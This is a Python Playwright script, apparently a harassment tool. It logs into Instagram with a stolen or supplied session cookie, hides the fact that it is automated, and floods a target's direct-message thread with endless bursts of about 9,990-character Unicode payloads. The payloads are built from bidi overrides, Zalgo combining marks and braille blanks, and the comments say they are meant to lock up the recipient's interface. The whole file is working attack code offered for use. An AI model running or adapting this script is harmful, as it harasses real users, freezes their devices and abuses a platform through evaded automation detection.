# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (GOD-MODE ATOMIC)
# 📅 STATUS: UI-FATAL | 2-MPS | DOCKER-READY

import os, asyncio, random, sys
from playwright.async_api import async_playwright

# --- AGGRESSION CONFIG ---
STRIKE_LIMIT = 10  # Hard-refresh every 10 to keep the machine gun firing at 100%
# -------------------------

def get_kernel_stop_payload():
    """Generates the most aggressive layout-thrashing block possible."""
    u_id = random.randint(1000, 9999)
    # The 'Glue' forces the entire 9000+ chars to be one single logical unit
    glue = "\u2060" 
    
    # 👑 THE BRANDING
    header = f"👑_𝕻𝕽𝕬𝖁𝕰𝕰𝕽_𝕻𝕬𝕻𝕬_👑{glue}☣️_TEAM_DEVEL_OWNED_☣️{glue}🆔_{u_id}{glue}"
    
    # 🏗️ THE 'LAYOUT CRUSHER'
    # Mixing Braille, Zalgo, and Inverted BIDI inside an atomic string
    z_tower = "̸" * 180 
    void_fill = "\u2800" * 30 # Forces thousands of pixels of invisible layout width
    
    body_elements = []
    for i in range(140):
        # Staggered BIDI Inversion: Forces the engine to flip-flop rendering logic
        p1 = "\u202E" if i % 2 == 0 else "\u202D"
        p2 = "\u2067" if i % 3 == 0 else "\u2066"
        
        # Combining Mathematical Fraktur and Double-Struck characters
        # This causes the 'Font-Fallback' engine to scan the entire system OS
        body_elements.append(f"{p1}{p2}𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕾_{void_fill}{z_tower}")
        
    return (header + glue.join(body_elements))[:9990]

async def agent_blitz(target_id, cookie):
    async with async_playwright() as p:
        # Launching with all security and sandbox blocks stripped away
        browser = await p.chromium.launch(
            headless=True, 
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu" # Forces CPU-only rendering which is easier to lock up
            ]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        
        page = await context.new_page()
        strike_count = 0

        async def sync_chat():
            print(f"📡 [GOD-MODE] Re-Synchronizing Atomic Socket...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            box = page.get_by_role("textbox", name="Message")
            await box.wait_for(state="visible", timeout=60000)
            return box

        try:
            box = await sync_chat()

            while True:
                # 🚀 2-MPS OVERCLOCKED BURST
                for _ in range(2):
                    payload = get_kernel_stop_payload()
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    strike_count += 1
                    print(f"💀 [STRIKE {strike_count}] ATOMIC BLOCK DELIVERED", flush=True)
                    await asyncio.sleep(0.01) # Reduced jitter to near-zero
                
                await asyncio.sleep(0.6)

                # 🛠️ SHADOW-BYPASS REFRESH (Aggressive threshold)
                if strike_count >= STRIKE_LIMIT:
                    print(f"🧊 [COOLING] Purging DOM & Resetting Thread...")
                    strike_count = 0
                    box = await sync_chat()
                    await asyncio.sleep(1)

        except Exception as e:
            print(f"❌ Critical Error: {str(e)[:100]}")
            await browser.close()

if __name__ == "__main__":
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    asyncio.run(agent_blitz(target_id, cookie))
